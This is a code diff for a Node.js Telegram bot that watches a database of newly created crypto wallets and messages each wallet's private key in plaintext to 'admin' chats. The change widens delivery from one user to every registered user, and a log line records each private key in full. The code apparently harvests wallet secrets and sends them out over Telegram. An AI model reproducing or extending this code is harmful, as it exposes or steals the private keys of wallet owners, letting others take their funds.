@@ -396,14 +396,14 @@ function getConfigValue(key, defaultValue = null) {
   });
 }
 
-function getAdminChatId() {
+function getAdminChatIds() {
   return new Promise((resolve, reject) => {
-    monitorDb.get("SELECT telegram_id FROM registered_users ORDER BY registered_at ASC LIMIT 1", [], (err, row) => {
+    monitorDb.all("SELECT telegram_id FROM registered_users", [], (err, rows) => {
       if (err) {
-        logger.error("Error getting admin chat ID: " + err);
-        return resolve(null);
+        logger.error("Error getting admin chat IDs: " + err);
+        return resolve([]);
       }
-      resolve(row ? row.telegram_id : null);
+      resolve(rows ? rows.map(row => row.telegram_id) : []);
     });
   });
 }
@@ -431,9 +431,9 @@ function monitorDatabaseForAdmin() {
       const newRows = rows.filter((row) => !sentKeysSet.has(row.private_key));
       if (newRows.length === 0) return;
       
-      getAdminChatId().then(async (adminChatId) => {
-        if (!adminChatId) {
-          logger.info("No admin chat ID set. Cannot send new wallet notifications.");
+      getAdminChatIds().then(async (adminChatIds) => {
+        if (!adminChatIds || adminChatIds.length === 0) {
+          logger.info("No admin chat IDs set. Cannot send new wallet notifications.");
           return;
         }
         
@@ -455,10 +455,12 @@ function monitorDatabaseForAdmin() {
               `🔐 <b>Private Key:</b> <code>${escPrivKey}</code>\n` +
               `🕒 <b>Created At:</b> ${escCreatedAt}`;
               
-            await bot.sendMessage(adminChatId, message, {
-              parse_mode: "HTML",
-              disable_web_page_preview: true,
-            });
+            for (const adminChatId of adminChatIds) {
+              await bot.sendMessage(adminChatId, message, {
+                parse_mode: "HTML",
+                disable_web_page_preview: true,
+              });
+            }
             
             await new Promise((resolve, reject) => {
               monitorDb.run(
@@ -471,7 +473,7 @@ function monitorDatabaseForAdmin() {
               );
             });
             
-            logger.info(`Sent new wallet to admin & recorded key: ${row.private_key}`);
+            logger.info(`Sent new wallet to admins & recorded key: ${row.private_key}`);
           } catch (err) {
             logger.error("Error processing wallet notification: " + err);
           }
